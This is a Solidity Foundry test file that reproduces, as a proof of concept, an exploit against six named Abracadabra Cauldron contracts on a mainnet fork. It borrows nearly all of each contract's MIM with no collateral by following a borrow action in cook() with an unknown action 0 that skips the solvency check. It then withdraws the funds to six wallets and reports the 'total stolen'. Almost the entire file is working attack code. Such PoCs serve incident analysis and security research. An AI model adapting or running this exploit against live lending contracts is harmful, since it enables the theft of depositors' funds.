// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface ICauldronV4 {
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256, uint256);

    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function totalCollateralShare() external view returns (uint256);
}

interface IDegenBox {
    function balanceOf(address token, address user) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256);
    function totals(address token) external view returns (uint128 elastic, uint128 base);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract AbracadabraExploitTest is Test {
    // The 6 exploited Cauldrons
    ICauldronV4[6] cauldrons;

    IDegenBox constant degenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    IERC20 constant MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);

    address constant attacker = 0x1AaaDe3e9062d124B7DeB0eD6DDC7055EFA7354d;

    uint8 constant ACTION_BORROW = 5;

    // MIM price = $1 (stablecoin)
    uint256 constant MIM_PRICE_USD = 1e18;

    // 1 recipient per Cauldron (6 addresses total)
    address[6] recipients;

    function setUp() public {
        // Fork at the real exploit block
        vm.createSelectFork("mainnet", 23504545);

        // The 6 vulnerable Cauldrons
        cauldrons[0] = ICauldronV4(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);
        cauldrons[1] = ICauldronV4(0x289424aDD4A1A503870EB475FD8bF1D586b134ED);
        cauldrons[2] = ICauldronV4(0xce450a23378859fB5157F4C4cCCAf48faA30865B);
        cauldrons[3] = ICauldronV4(0x40d95C4b34127CF43438a963e7C066156C5b87a3);
        cauldrons[4] = ICauldronV4(0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2);
        cauldrons[5] = ICauldronV4(0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d);

        // 1 recipient per Cauldron
        recipients[0] = makeAddr("recipient1");
        recipients[1] = makeAddr("recipient2");
        recipients[2] = makeAddr("recipient3");
        recipients[3] = makeAddr("recipient4");
        recipients[4] = makeAddr("recipient5");
        recipients[5] = makeAddr("recipient6");

        vm.label(address(degenBox), "DegenBox");
        vm.label(address(MIM), "MIM");
        vm.label(attacker, "Attacker");
    }

    function testExploit_Full_Drain() public {
        console.log("================================================================");
        console.log("       ABRACADABRA MULTI-CAULDRON EXPLOIT - POC                ");
        console.log("================================================================");
        console.log("");

        console.log("EXPLOITING 6 CAULDRONS (1 address per Cauldron)");
        console.log("----------------------------------------------------------------");
        console.log("");

        vm.startPrank(attacker);

        uint256 totalStolen = 0;
        uint256 successfulBorrows = 0;

        // Exploit each Cauldron with its dedicated address
        for (uint i = 0; i < 6; i++) {
            console.log("=== CAULDRON", i + 1, "===");
            console.log("Address:", address(cauldrons[i]));

            // Check available MIM in this Cauldron
            uint256 cauldronShares = degenBox.balanceOf(address(MIM), address(cauldrons[i]));
            uint256 cauldronMIM = degenBox.toAmount(address(MIM), cauldronShares, false);

            console.log("  MIM available:", cauldronMIM / 1e18, "MIM");

            if (cauldronMIM < 1000 ether) {
                console.log("  [SKIP] Not enough MIM in this Cauldron");
                console.log("");
                continue;
            }

            // Calculate borrow amount (100% - small margin to avoid underflow)
            uint256 borrowAmount = cauldronMIM > 100 ether ? cauldronMIM - 100 ether : cauldronMIM;

            console.log("  Borrowing:", borrowAmount / 1e18, "MIM");
            console.log("  Recipient:", recipients[i]);

            uint8[] memory actions = new uint8[](2);
            uint256[] memory values = new uint256[](2);
            bytes[] memory datas = new bytes[](2);

            // Action 0: BORROW to recipient[i]
            actions[0] = ACTION_BORROW;
            values[0] = 0;
            datas[0] = abi.encode(int256(borrowAmount), recipients[i]);

            // Action 1: Unknown action (0) - bypass solvency check
            actions[1] = 0;
            values[1] = 0;
            datas[1] = "";

            // Execute the exploit on this Cauldron
            try cauldrons[i].cook(actions, values, datas) {
                // Check balance in DegenBox
                uint256 stolenFromThisCauldron = degenBox.balanceOf(address(MIM), recipients[i]);
                totalStolen += stolenFromThisCauldron;
                successfulBorrows++;

                console.log("  [SUCCESS] Stolen:", stolenFromThisCauldron / 1e18, "MIM");
            } catch Error(string memory reason) {
                console.log("  [FAILED]", reason);
            } catch {
                console.log("  [FAILED] Unknown error");
            }

            console.log("");
        }

        console.log("");
        console.log("=== WITHDRAWING MIM FROM DEGENBOX ===");
        console.log("");

        // Withdraw MIM from each recipient to their wallet
        for (uint i = 0; i < 6; i++) {
            uint256 recipientShares = degenBox.balanceOf(address(MIM), recipients[i]);

            if (recipientShares > 0) {
                if (i == 0) console.log("Recipient 1 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 1) console.log("Recipient 2 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 2) console.log("Recipient 3 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 3) console.log("Recipient 4 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 4) console.log("Recipient 5 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 5) console.log("Recipient 6 - Withdrawing", recipientShares / 1e18, "MIM shares");

                // Withdraw must be done from the address holding the shares
                // Switch to recipient to perform withdrawal
                vm.stopPrank();
                vm.startPrank(recipients[i]);

                try degenBox.withdraw(
                    address(MIM),
                    recipients[i],
                    recipients[i],
                    0, // amount = 0 means use shares
                    recipientShares
                ) returns (uint256 amountOut, uint256) {
                    console.log("  -> Withdrawn:", amountOut / 1e18, "MIM to wallet");
                    console.log("  -> Wallet balance:", MIM.balanceOf(recipients[i]) / 1e18, "MIM");
                } catch Error(string memory reason) {
                    console.log("  [!] Withdraw failed:", reason);
                } catch {
                    console.log("  [!] Withdraw failed (unknown reason)");
                }

                vm.stopPrank();
                vm.startPrank(attacker);
            }
        }

        vm.stopPrank();

        console.log("");
        console.log("EXPLOIT SUMMARY");
        console.log("================================================================");

        // Final distribution across wallets
        console.log("MIM DISTRIBUTION ACROSS 6 WALLETS:");
        console.log("----------------------------------------------------------------");
        uint256 totalInWallets = 0;
        for (uint i = 0; i < 6; i++) {
            uint256 walletBalance = MIM.balanceOf(recipients[i]);
            if (walletBalance > 0) {
                console.log("  Wallet address:", recipients[i]);
                console.log("  Balance:", walletBalance / 1e18, "MIM");
                totalInWallets += walletBalance;
            }
        }
        console.log("  ---");
        console.log("  TOTAL in wallets:", totalInWallets / 1e18, "MIM");
        console.log("");

        // Calculate USD value (MIM = $1 stablecoin)
        uint256 totalUSD = (totalInWallets * MIM_PRICE_USD) / 1e18;

        console.log("Successful Cauldrons exploited:", successfulBorrows, "/6");
        console.log("Total MIM in DegenBox:", totalStolen / 1e18, "MIM");
        console.log("Total MIM withdrawn:", totalInWallets / 1e18, "MIM");
        console.log("");
        console.log("FINANCIAL IMPACT:");
        console.log("----------------------------------------------------------------");
        console.log("  Total Value: $", totalUSD / 1e18, "USD");
        console.log("  Collateral: 0 (ZERO!)");
        console.log("");
        console.log("[SUCCESS] Multi-Cauldron exploit completed!");
        console.log("[SUCCESS] Total stolen: $", totalUSD / 1e18, "USD");
        console.log("[SUCCESS] Cauldrons exploited:", successfulBorrows);
        console.log("");

        assertGt(totalStolen, 0, "Exploit failed");
    }
}
